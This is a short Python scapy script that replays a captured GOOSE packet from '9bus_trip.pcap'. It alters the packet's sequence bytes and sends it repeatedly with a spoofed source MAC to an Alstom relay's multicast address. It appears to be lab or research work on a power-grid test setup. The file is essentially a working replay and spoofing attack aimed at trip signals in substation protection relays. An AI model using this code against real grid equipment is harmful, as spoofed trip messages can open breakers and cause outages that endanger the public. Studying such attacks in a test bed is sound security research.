from scapy.all import *
import os
import binascii

#targeting folder and file pcap 
THIS_FOLDER = os.path.dirname(os.path.abspath(__file__))
my_file = os.path.join(THIS_FOLDER, '9bus_trip.pcap')

#MAC Address references
#source = {'siemens1': "b4:b1:5a:05:30:6d",'siemens2':"b4:b1:5a:05:30:61",'alstom':"80:b3:2a:0c:23:76"}
#dest={'siemens1': "01:0c:cd:01:00:01", 'siemens2':"01:0c:cd:01:00:00",'alstom':"01:0c:cd:01:00:20"}

source = {'UKgrid1': "80:b3:2a:0c:6d:7a",'UKgrid2': "80:b3:2a:0c:23:76",'RTDS':"00:50:c2:4f:9a:2b",'Siemens1': "b4:b1:5a:05:30:6d",'IEC1': "01:0c:cd:01:00:01", 'IEC2':"01:0c:cd:01:00:00",'Alstom':"01:0c:cd:01:00:20"}
dest= {'UKgrid1': "80:b3:2a:0c:6d:7a",'UKgrid2': "80:b3:2a:0c:23:76",'RTDS':"00:50:c2:4f:9a:2b",'Siemens1': "b4:b1:5a:05:30:6d",'IEC1': "01:0c:cd:01:00:01", 'IEC2':"01:0c:cd:01:00:00",'Alstom':"01:0c:cd:01:00:20"}


#reading file pcap save as variabel pcap_data
pcap_data=rdpcap(my_file)

#get total quantity of packets in pcap file
packetq = len(pcap_data)

#print("number of packet:"+len(pcap_data))
print("Number of Packets: %s" % packetq)
print('===================================================')

# Set Sequence number
getload = list(bytes(pcap_data[0].payload))
getload[113]=1
getload[114]=195
bytesload = bytes(getload)

#loop to proces each packet
count = 0
while (count < 11):
    #convert payload packet from bytes to hex
	hexform=binascii.hexlify(bytesload)
	print(count)
	print(hexform)
	print("--------")

	#Create packet combination address target and payload
	crafted=Ether(src=source['UKgrid2'],dst= dest['Alstom'])/bytesload
	hexcrafted=binascii.hexlify(bytes(crafted))
	print(count)


	#set packet type
	crafted.type=0x88b8

	#send packet
	sendp(crafted,inter=1./800,iface='Ethernet')
	
	print("========")
	#time.sleep(1)
	count = count + 1


"""
x = 0
while (x < 20):
	count = 19
	#convert payload packet from bytes to hex
	hexform=binascii.hexlify(bytes(pcap_data[count].payload))
	print(count)
	print(hexform)
	print("--------")
	#Create packet combination address target and payload
	crafted=Ether(src=source['UKgrid2'],dst= dest['Alstom'])/pcap_data[count].payload
	hexcrafted=binascii.hexlify(bytes(crafted))
	print(hexcrafted)


	#set packet type
	crafted.type=0x88b8

	#send packet
	sendp(crafted,inter=1./800,iface='Ethernet')
	x = x + 1
	print("========")
"""